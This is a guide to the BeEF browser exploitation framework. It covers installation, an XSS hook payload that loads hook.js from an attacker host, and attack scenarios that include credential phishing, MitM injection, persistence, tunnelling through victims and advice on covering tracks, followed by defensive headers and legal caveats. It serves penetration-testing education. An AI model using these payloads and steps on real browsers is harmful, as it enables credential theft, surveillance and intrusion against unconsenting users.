# 🐮 BeEF - Browser Exploitation Framework

> The most powerful browser exploitation framework for penetration testing

---

## 📋 Overview

**BeEF** (Browser Exploitation Framework) is a penetration testing tool that focuses on exploiting web browser vulnerabilities. Unlike traditional security tools that focus on network or server-side vulnerabilities, BeEF hooks browsers and enables the pentester to launch directed command modules against them.

**Key Features:**
- 🎯 Browser hooking and control
- 🔌 Extensive command module library
- 🌐 Cross-browser exploitation
- 📡 Network scanning through hooked browsers
- 🔄 Persistence mechanisms
- 🕸️ Social engineering capabilities
- 📊 Real-time browser information gathering

---

## 🛠️ Installation

### On Kali Linux (Pre-installed)
```bash
# Update and start BeEF
cd /usr/share/beef-xss
sudo ./beef
```

### Manual Installation on Linux
```bash
# Install dependencies
sudo apt update
sudo apt install ruby ruby-dev git curl -y

# Clone BeEF
git clone https://github.com/beefproject/beef.git
cd beef

# Install Ruby gems
bundle install

# Run installation script
./install

# Start BeEF
./beef
```

### Docker Installation
```bash
# Pull BeEF Docker image
docker pull beefproject/beef-xss

# Run BeEF in Docker
docker run -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 \
    beefproject/beef-xss
```

---

## 🚀 Getting Started

### Starting BeEF
```bash
# Start BeEF server
cd /usr/share/beef-xss
sudo ./beef

# Default credentials
# Username: beef
# Password: beef (change this!)
```

### Accessing the UI
- **Control Panel**: `http://127.0.0.1:3000/ui/panel`
- **Hook URL**: `http://127.0.0.1:3000/hook.js`

### Configuration
Edit `/usr/share/beef-xss/config.yaml`:
```yaml
beef:
    http:
        host: "0.0.0.0"
        port: "3000"
    credentials:
        user: "beef"
        passwd: "beef"
```

---

## 📚 Basic Usage

### Step 1: Hook a Browser
```html
<!-- Insert this script into target page -->
<script src="http://YOUR-IP:3000/hook.js"></script>
```

### Step 2: Inject Hook Script
Methods to inject the hook:
1. **XSS Vulnerability**: `<script src="http://attacker:3000/hook.js"></script>`
2. **MitM Attack**: Inject via network interception
3. **Social Engineering**: Malicious website/email
4. **DNS Spoofing**: Redirect to malicious page

### Step 3: Control Hooked Browsers
Once hooked, access via BeEF UI:
- View online browsers
- Execute command modules
- Gather information
- Launch attacks

---

## 🎯 Command Modules

### Browser Information
```
# Basic information
- Browser name and version
- Operating system
- Plugins installed
- Screen resolution
- Geolocation
- Internal IP address
```

### Social Engineering
```
# Fake notifications
- Fake update prompts
- Fake plugin installs
- Credential phishing
- Fake login pages
- Alert/confirm dialogs
```

### Network Discovery
```
# Network scanning
- Port scanning
- Internal network discovery
- Detect local services
- Find other hosts
```

### Exploitation
```
# Advanced attacks
- Keylogging
- Webcam access
- Clipboard theft
- File system access (with user interaction)
- Cookie stealing
- Session hijacking
```

---

## 💡 Real-World Attack Scenarios

### Scenario 1: Credential Harvesting
```javascript
// Execute from BeEF UI
1. Hook browser via XSS
2. Run "Pretty Theft" module
3. Display fake login (Facebook, Gmail, etc.)
4. Capture credentials when user enters them
5. Redirect to legitimate site
```

### Scenario 2: Internal Network Reconnaissance
```javascript
// Network discovery through hooked browser
1. Hook browser on corporate network
2. Use "Network Fingerprint" module
3. Scan internal network ranges
4. Identify services and systems
5. Map internal infrastructure
```

### Scenario 3: Browser Exploitation Chain
```javascript
// Multi-stage attack
1. Initial hook via compromised website
2. Detect browser and plugins
3. Run appropriate exploit module
4. Establish persistence
5. Pivot to internal resources
```

### Scenario 4: Man-in-the-Middle
```javascript
// Intercept traffic
1. Position in network path
2. Inject BeEF hook into HTTP traffic
3. Hook all browsers on network
4. Monitor and manipulate traffic
5. Launch targeted attacks
```

### Scenario 5: Social Engineering Campaign
```javascript
// Phishing attack
1. Create convincing phishing page
2. Embed BeEF hook
3. Send via email/social media
4. Hook victims' browsers
5. Execute modules based on context
```

---

## 🔧 Advanced Techniques

### Persistence
```javascript
// Keep browser hooked
1. Use iFrame persistence module
2. Create browser extensions
3. Modify bookmarks
4. Local storage persistence
```

### Tunneling
```bash
# Proxy through hooked browser
1. Enable "Web Proxy" module
2. Route traffic through victim
3. Access internal resources
4. Bypass firewall restrictions
```

### REST API Usage
```bash
# Programmatic control
curl -H "Content-Type: application/json" \
     -X POST \
     -d '{"username":"beef","password":"beef"}' \
     http://127.0.0.1:3000/api/admin/login

# Execute module
curl -H "Content-Type: application/json" \
     -H "Authorization: $TOKEN" \
     -X POST \
     -d '{"command_module_id":"1","hooked_browser_id":"1"}' \
     http://127.0.0.1:3000/api/modules/execute
```

### Custom Modules
```javascript
// Create custom BeEF module
// /usr/share/beef-xss/modules/custom/my_module/module.rb
{
  'Name': 'My Custom Module',
  'Description': 'Custom functionality',
  'Category': 'Exploits',
  'Author': 'Your Name',
  'Execute': function() {
    // Module code here
    beef.net.send('/api/hook', 1, 'POST', 
      {'data': 'custom data'});
  }
}
```

---

## 🛡️ Defense Against BeEF

### Detection Methods
```
1. Monitor for hook.js patterns
2. Check for unusual JavaScript
3. Use Content Security Policy (CSP)
4. Network traffic analysis
5. Browser extension monitoring
```

### Prevention
```
# Content Security Policy
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'

# X-Frame-Options
X-Frame-Options: SAMEORIGIN

# Input validation
- Sanitize all user input
- Escape output properly
- Use frameworks with XSS protection
```

### Security Headers
```nginx
# Nginx configuration
add_header Content-Security-Policy "default-src 'self';" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
```

---

## 📊 BeEF Architecture

### Components
```
┌─────────────────────────────────────┐
│         BeEF Control Panel          │
│       (Web UI at :3000/ui)          │
└──────────────┬──────────────────────┘
               │
        ┌──────┴──────┐
        │  BeEF Core  │
        │   Engine    │
        └──────┬──────┘
               │
    ┌──────────┼──────────┐
    │          │          │
┌───▼────┐ ┌──▼───┐ ┌────▼────┐
│ Hook   │ │ API  │ │ Command │
│ Script │ │      │ │ Modules │
└────────┘ └──────┘ └─────────┘
```

### Hook Communication
```
Browser ←──────→ BeEF Server
(hook.js)        (command server)
    │                  │
    │   Polling        │
    ├─────────────────→│
    │   Commands       │
    │←─────────────────┤
    │   Results        │
    ├─────────────────→│
```

---

## 🎓 Module Categories

### Browser Modules
- Browser fingerprinting
- Cookie/session stealing
- Tab management
- Popup control
- History manipulation

### Network Modules
- Port scanning
- Service detection
- DNS enumeration
- CORS testing
- WebRTC leaks

### Social Engineering
- Fake notifications
- Credential harvesting
- Clickjacking
- Tab napping
- Form cloning

### Persistence
- iFrame persistence
- Web Worker persistence
- Service Worker hooks
- LocalStorage persistence

### Exploitation
- Known CVE exploits
- Browser-specific attacks
- Plugin exploitation
- Protocol handlers

---

## 🚨 Best Practices

### For Penetration Testing
```
1. Always get written authorization
2. Define clear scope
3. Document all actions
4. Use only necessary modules
5. Clean up after testing
6. Report responsibly
```

### BeEF Security
```
1. Change default credentials
2. Use strong passwords
3. Restrict network access
4. Enable SSL/TLS
5. Keep BeEF updated
6. Monitor logs
```

### Operational Security
```
1. Use VPS/cloud infrastructure
2. Rotate IPs if needed
3. Use HTTPS for C2
4. Clean browser storage
5. Don't leave traces
```

---

## 🔍 Useful Commands

### Server Management
```bash
# Start BeEF
./beef

# Stop BeEF
Ctrl+C or kill process

# Update BeEF
git pull
bundle install

# Reset password
./beef -x

# Check version
./beef -v
```

### API Interaction
```bash
# Get hooked browsers
curl -H "Authorization: $TOKEN" \
     http://127.0.0.1:3000/api/hooks

# Get available modules
curl -H "Authorization: $TOKEN" \
     http://127.0.0.1:3000/api/modules

# Get logs
curl -H "Authorization: $TOKEN" \
     http://127.0.0.1:3000/api/logs
```

---

## 📖 Learning Resources

- **Official Documentation**: [https://github.com/beefproject/beef/wiki](https://github.com/beefproject/beef/wiki)
- **BeEF Project**: [https://beefproject.com/](https://beefproject.com/)
- **Exploit DB**: BeEF module database
- **TryHackMe**: Browser exploitation rooms
- **YouTube**: BeEF demonstration videos

---

## ⚠️ Legal and Ethical Considerations

### Legal Requirements
- ✅ Written authorization required
- ✅ Define clear scope and boundaries
- ✅ Follow local laws and regulations
- ✅ Responsible disclosure practices

### Prohibited Activities
- ❌ Unauthorized browser hooking
- ❌ Stealing credentials/data
- ❌ Causing damage or disruption
- ❌ Privacy violations
- ❌ Using for malicious purposes

### Ethical Guidelines
```
1. Test only authorized systems
2. Respect user privacy
3. Don't abuse access
4. Report findings properly
5. Help improve security
```

---

## 🔗 Related Tools

- **Social Engineering Toolkit (SET)** - Broader social engineering
- **Evilginx2** - Advanced phishing framework
- **Modlishka** - Reverse proxy phishing
- **GoPhish** - Phishing campaign management

---

## 🎯 Integration Examples

### With Metasploit
```bash
# Use BeEF with Metasploit
use auxiliary/server/capture/http_javascript_keylogger
set BEEF_URL http://127.0.0.1:3000/hook.js
```

### With Bettercap
```bash
# MitM + BeEF injection
bettercap -eval "set http.proxy.script beef-inject.js; http.proxy on"
```

### With SET
```bash
# Social Engineering Toolkit integration
set> beef
```

---

*Control browsers, understand client-side risks. Use for legitimate security testing only.*
